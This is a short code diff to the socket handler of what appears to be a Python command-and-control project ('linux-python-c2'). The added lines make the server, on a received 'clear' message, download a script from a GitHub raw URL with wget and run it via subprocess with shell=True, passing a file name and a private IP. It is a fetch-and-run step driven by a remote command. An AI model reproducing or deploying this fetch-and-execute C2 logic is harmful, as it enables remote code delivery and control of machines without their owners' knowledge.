@@ -10,6 +10,8 @@ def binder(cSocket, cAddr):
             if msg == 'exit':
                 break
             if msg.find('clear') == 0:
+                if not os.path.exists('cfile.py') :
+                    subprocess.run('wget https://raw.githubusercontent.com/zzzangmans1/linux-python-c2/main/cfile.py', shell=True)
                 time.sleep(3)
                 subprocess.run('gnome-terminal --command "python3 cfile.py -f 123.png -i 10.211.55.4"', shell=True)
                 
